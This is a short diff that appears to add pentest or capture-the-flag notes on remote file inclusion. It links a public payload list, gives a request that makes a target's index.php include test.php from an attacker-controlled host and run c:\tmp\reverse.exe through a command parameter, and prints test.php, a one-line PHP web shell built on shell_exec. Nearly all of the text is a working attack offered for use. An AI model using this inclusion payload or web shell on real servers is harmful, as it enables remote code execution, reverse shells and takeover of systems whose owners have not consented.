@@ -1,0 +1,6 @@
+https://github.com/payloadbox/rfi-lfi-payload-list
+
+http://<SERVER IP>/site/index.php?page=http://<ATTACKER IP>/test.php&cmd=c:\tmp\reverse.exe
+
+cat test.php 
+<?php echo shell_exec($_GET['cmd']); ?>
